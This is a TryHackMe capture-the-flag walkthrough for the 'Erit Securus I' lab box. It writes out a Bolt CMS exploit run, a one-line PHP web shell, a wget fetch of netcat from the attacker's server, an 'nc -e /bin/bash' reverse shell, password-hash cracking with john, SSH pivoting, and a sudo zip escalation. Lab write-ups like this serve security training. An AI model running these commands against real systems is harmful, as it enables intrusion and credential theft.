---
title: "Erit Securus I"
date: 2020-07-20
layout: "writeup"
difficulty: "Easy"
excerpt: "Walkthrough for Erit Securus I on TryHackme"
os: "Linux"
platform: "TryHackMe"
tags: [Erit Securus I, TryHackMe, pivoting, bolt cms]
comments: false
---

Erit Securus I is an easy rated difficulty box on [TryHackMe](https://www.tryhackme.com). Below are the steps taken to compromise this system.

### Task 1

Task 1 just requires you to deploy the box and confirm that you have started it up.

### Task 2

Task 2 asks you to scan the box, running `nmap -A [machine ip]` provides you with the answers to **Question 1** and **Question 2**.

![Erit Securus nmap](/images/EritSecurus1.png)

### Task 3

There is only one question to answer for this task, which asks you what CMS is being utilized. This can be found by opening up the website in your browser and scrolling to the bottom of the page.

![Erit Securus CMS type](/images/EritSecurus2.png)

### Task 4

Task 4 asks you to download an [exploit](https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py). **Question 1** asks what language the exploit is coded in. Reviewing the exploit itself tells you what language it is coded in on line 1 of the exploit.

![Erit Securus exploit language](/images/EritSecurus3.png)

**Question 2** asks you to find the login page to bolt. This can be found in the exploit on line 44 of the exploit code. You are also provided with credentials to login with in the hint for this question.

![Erit Securus bolt login page](/images/EritSecurus4.png)

### Task 5

Save the exploit code to your attacker machine. Next, go to the directory where you saved the exploit, and run `python3 exploit.py http://[machine ip] username password`. The username and password were provided in the previous Task's hint. Once connected, run either `whoami` or `id` to get the username to answer **Question 1**.

![Erit Securus bolt exploit](/images/EritSecurus5.png)

Next, follow the steps mentioned in the room to establish a reverse shell. First, run `echo '\<?php system($_GET["c"]);?\>'\>c.php`. This creates a file named **c.php** which you can use to send system commands through.

![Erit Securus c.php](/images/EritSecurus6.png)

Next, open another terminal window on your attacker machine and run `ln -s $(which nc)`. This will be used to link netcat to the current directory.

![Erit Securus netcat link](/images/EritSecurus7.png)

Next, run `python3 -m http.server` to serve up an http server that will be used by the victim machine to pull over netcat.

![Erit Securus python3 http server](/images/EritSecurus8.png)

Next, navigate to **http://[machine ip]/files/c.php?c=whoami** to see if your php file you created a few lines above works as expected, it should return a result of www-data.

![Erit Securus whoami](/images/EritSecurus9.png)

Next, change the command above from whoami to `wget http://[attackerip]:8000/nc`.

![Erit Securus wget nc](/images/EritSecurus10.png)

 Nothing will show up in the browser window, but if you look at your python http server, you should see that a file (nc) was transferred to the victim computer.

![Erit Securus wget download nc](/images/EritSecurus11.png)

Create a netcat listener on our attacker pc with **nc -nvlp [port number]**.

![Erit Securus nc listener](/images/EritSecurus12.png)

Now, change the URL on the victim machine from the wget command to **http://[machine ip]/files/c.php?c=chmod 755 nc** to make netcat an executable on the victim machine.

![Erit Securus chmod](/images/EritSecurus13.png)

You will not see any confirmation that the permissions were changed on this file. However, we should now be able to run nc on the victim computer with **http://[machine ip]/files/c.php?c=./nc -e /bin/bash [attacker ip] [port nc is listening on]**. You should now have a connection on your attacker computer.

![Erit Securus bash shell](/images/EritSecurus14.png)

Now, let's get a nicer shell by running `python -c 'import pty; pty.spawn("/bin/sh")'`.

![Erit Securus python shell](/images/EritSecurus15.png)

### Task 6

Now that we have a reverse shell, run `cd /var/www/html/app/database` to get into the directory the bolt database is in as specified in the directions.

![Erit Securus database](/images/EritSecurus16.png)

Next, run `sqlite3 bolt.db` to open the database. Then run **.tables** to list the tables. Last, let's enumerate the users with `SELECT * from bolt_users;`

![Erit Securus database user enumeration](/images/EritSecurus17.png)

We currently have the credentials for admin, but not for wildone. Copy the entire hash (between the second and third | characters) and save it to a file. I saved it to a file named erithashes.txt. Next, run `john erithashes.txt -wordlist=/usr/share/wordlists/rockyou.txt`. This will crack the password for wildone, which is the answer to **Question 1** for this task.

![Erit Securus wildone password](/images/EritSecurus18.png)

Next, follow the provided instructions and run `su wileec` and enter the password you just cracked.

![Erit Securus wileec user](/images/EritSecurus19.png)

Next, type in `cd /home/wileec`, followed by `ls`, and then `cat flag1.txt` to get the answer to **Question 2**.

![Erit Securus flag1.txt](/images/EritSecurus20.png)

### Task 7

Next, let's follow the directions provided and run `ssh wileec@192.168.100.1` from our current session as wileec to pivot to another machine.

![Erit Securus ssh](/images/EritSecurus21.png)

Next, run `sudo -l` to see what privileges can be ran as sudo, which is the answer to **Question 1**.

![Erit Securus sudo -l](/images/EritSecurus22.png)

### Task 8

Lets look at [GTFOBins](https://gtfobins.github.io/) to see what ways we can escalate with the command listed in sudo -l. Looking up this command will show you a way to elevate privileges with sudo. Enter the following commands to elevate privileges: `TF=$(mktemp -u)` followed by `sudo -u jsmith zip $TF /etc/hosts -T -TT 'sh #'`.

![Erit Securus gtfobins zip su jsmith](/images/EritSecurus23.png)

Next, run `cd ..` followed by `cd jsmith` to get into jsmith's home directory and then run `ls -al` to list the contents, there is a second flag here. View the flag with `cat flag2.txt`. This is the answer to **Question 1** for Task 8.

### Task 9

Let's run `sudo -l` as jsmith and see what commands they can potentially run as root.

![Erit Securus jsmith sudo -l](/images/EritSecurus25.png)

What they can run as sudo is the answer to **Question 1**. Next, there are numerous ways to gain root, but the easiest way is with `sudo su root`. From here run `cd /root` followed by `ls`. Run `cat flag3.txt` to get the final flag and the answer to **Question 2** to finish this challenge!

![Erit Securus flag3.txt](/images/EritSecurus26.png)
